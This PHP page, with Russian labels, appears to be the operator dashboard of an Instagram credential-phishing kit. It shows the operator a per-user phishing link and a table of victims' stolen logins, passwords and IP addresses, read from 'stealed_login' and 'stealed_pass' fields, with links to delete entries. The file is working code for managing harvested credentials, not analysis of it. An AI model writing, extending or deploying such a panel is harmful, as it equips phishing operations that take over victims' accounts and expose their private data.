<?php

use \core\Controller;
use \core\Model;

$id = Controller::getAuth();

$stmt = Model::prepare("SELECT * FROM users LEFT JOIN accounts ON users.id = accounts.user_id WHERE users.id = ?");

$result = $stmt->execute([$id]);

if(!$result) exit('Ошибка');

$data = $stmt->fetchall(\PDO::FETCH_ASSOC);

$id = $data[0]['id'];


?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
    <a href="<?= Controller::url('logout') ?>">logout</a>
    <a href="<?= Controller::url('change') ?>">Изменить пароль</a>
    <h2><?= $data[0]['login']?></h2>
    <p><?= Controller::getSet('instagram') . "?id=$id" ?></p>
    <table>
        <tr>
            <td>Логин</td>
            <td>Пароль</td>
            <td>IP</td>
        </tr>
        <?php if(isset($data[0]['steal_id'])): ?>
            <?php foreach($data as $d): ?>
                <tr>
                    <td><?= $d['stealed_login'] ?></td>
                    <td><?= $d['stealed_pass'] ?></td>
                    <td><?= $d['ip'] ?></td>
                    <td>
                        <a href="<?= Controller::url('delete') . "?id=" . $d['steal_id'] ?>">Удалить</a>
                    </td>
            <?php endforeach; ?>
        <?php endif; ?>
        </tr>
    </table>
</body>
</html>
